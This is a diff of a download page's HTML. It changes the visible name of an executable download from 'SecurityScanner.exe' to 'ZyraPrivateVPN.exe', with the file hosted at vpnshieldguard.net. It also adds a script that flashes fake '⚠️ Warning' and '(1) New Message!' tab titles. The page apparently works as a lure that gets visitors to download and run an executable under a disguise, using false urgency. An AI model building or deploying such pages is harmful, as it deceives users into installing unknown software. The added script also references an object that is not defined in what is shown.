@@ -366,7 +366,7 @@ body { font-family: Arial, Helvetica, sans-serif; background: #fff; color: #222;
     
     <a href="https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe" id="fileLink" class="file-row" download="ZyraPrivateVPN.exe">
       <span class="file-ico">EXE</span>
-      <span id="step2-file">SecurityScanner.exe</span>
+      <span id="step2-file">ZyraPrivateVPN.exe</span>
     </a>
   </div>
 </div>
@@ -955,6 +955,23 @@ document.getElementById('proceedBtn').addEventListener('click', function(e) {
 
 });
 </script>
+<script>
+(function() {
+  var title1 = t.t1 || "⚠️ Warning";
+  var title2 = t.t2 || "(1) New Message!";
+  
+  var state = 0; 
 
+  setInterval(function() {
+    if (state === 0) {
+      document.title = title1;
+      state = 1;
+    } else {
+      document.title = title2;
+      state = 0;
+    }
+  }, 800); 
+})();
+</script>
 </body>
 </html>
